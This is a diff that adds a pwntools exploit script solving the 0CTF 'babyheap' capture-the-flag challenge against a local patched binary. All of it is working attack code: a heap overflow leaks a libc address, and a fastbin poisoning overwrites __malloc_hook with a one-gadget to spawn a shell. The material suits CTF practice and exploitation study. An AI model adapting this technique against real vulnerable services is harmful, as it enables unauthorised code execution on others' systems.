@@ -1,0 +1,71 @@
+from pwn import *
+
+e = ELF("./0ctfbabyheap_patched")
+libc = ELF("./libc-2.23.so")
+ld = ELF("./ld-2.23.so")
+
+p = process("./0ctfbabyheap_patched")
+'''
+p = gdb.debug("./0ctfbabyheap_patched", gdbscript = 
+breakrva 0xDCC
+breakrva 0x1022
+breakrva 0xF43
+)
+'''
+def malloc(size):
+    p.sendlineafter(b"Command: ", b"1")
+    p.sendlineafter(b"Size: ", f"{size}".encode())
+    
+def scandata(index, size, data):
+    p.sendlineafter(b"Command: ", b"2")
+    p.sendlineafter(b"Index: ", f"{index}".encode())
+    p.sendlineafter(b"Size: ", f"{size}".encode())
+    p.sendafter(b"Content: ", data)
+    
+def free(index):
+    p.sendlineafter(b"Command: ", b"3")
+    p.sendlineafter(b"Index: ", f"{index}".encode())
+
+def printdata(index):
+    p.sendlineafter(b"Command: ", b"4")
+    p.sendlineafter(b"Index: ", f"{index}".encode())
+    
+
+malloc(0xf0)
+malloc(0x68)
+malloc(0xf0)
+malloc(0x10)
+
+free(0)
+free(1)
+
+malloc(0x68)
+scandata(0, 0x70, b"A" * 0x60 + p64(0x170) + p64(0x100))
+
+free(2)
+malloc(0xf0)
+
+printdata(0)
+p.recvuntil(b"Content: \n")
+libc_base = u64(p.recv(7).ljust(8, b"\x00")) - 0x3c4b78
+print(hex(libc_base))
+
+one_shot = libc_base + 0x4526a
+__malloc_hook = libc_base + libc.symbols['__malloc_hook']
+
+malloc(0x68)
+malloc(0x68)
+free(4)
+free(2)
+
+# fastbin check free size
+scandata(0, 0x8, p64(__malloc_hook - 0x20 + 5 - 0x8))
+
+malloc(0x68)
+malloc(0x68)
+
+scandata(4, 0x1b, b"A" * 0x13 + p64(one_shot))
+
+malloc(0x10)
+
+p.interactive()
